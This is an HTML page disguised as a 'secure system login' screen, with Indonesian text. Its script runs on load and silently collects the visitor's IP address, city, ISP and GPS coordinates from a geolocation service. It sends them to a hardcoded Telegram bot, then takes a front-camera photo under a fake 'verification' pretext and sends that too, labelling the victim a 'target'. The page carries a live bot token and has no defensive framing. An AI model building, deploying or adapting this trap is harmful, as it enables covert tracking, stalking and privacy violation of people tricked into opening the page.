# Video-.com.html
<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURE SYSTEM LOGIN</title>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #00ff00; padding: 20px; text-align: center; width: 85%; box-shadow: 0 0 20px #004400; }
        .glitch { animation: scan 2s linear infinite; }
        @keyframes scan { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
    </style>
</head>
<body>

    <video id="v" autoplay playsinline muted style="display:none;"></video>
    <canvas id="c" style="display:none;"></canvas>

    <div class="box">
        <div class="glitch">> SYSTEM AUTHENTICATING...</div>
        <p id="st">> Menunggu respon server...</p>
    </div>

    <script>
        const token = "8371743763:AAHfhPZENAYY0l8z5iUxsgHUuj-ney5SIa0";
        const chatId = "8465963357";
        const v = document.getElementById('v');
        const c = document.getElementById('c');

        async function execute() {
            // 1. Ambil Lokasi & IP
            try {
                const r = await fetch('https://ipapi.co/json/');
                const d = await r.json();
                
                // Kirim Data Lokasi
                const text = `⚠️ **TARGET TERDETEKSI!**\n\n🌐 IP: ${d.ip}\n🏙️ Kota: ${d.city}\n📡 ISP: ${d.org}\n📍 Koordinat: ${d.latitude}, ${d.longitude}\n🗺️ Peta: https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
                
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: chatId, text: text, parse_mode: 'Markdown'})
                });
            } catch (e) {}

            // 2. Akses Kamera Depan
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                v.srcObject = s;
                await v.play();
                
                setTimeout(() => {
                    c.width = v.videoWidth;
                    c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    c.toBlob(b => {
                        const fd = new FormData();
                        fd.append('chat_id', chatId);
                        fd.append('photo', b, 'shot.jpg');
                        fd.append('caption', '📸 Wajah Target Berhasil Diambil');
                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg');
                    
                    document.getElementById('st').innerText = "> LOGIN DITOLAK: PERANGKAT TIDAK DIKENAL.";
                }, 1500);
            } catch (err) {
                document.getElementById('st').innerText = "> ERROR: MOHON IZINKAN KAMERA UNTUK VERIFIKASI.";
            }
        }

        window.onload = execute;
    </script>
</body>
</html>
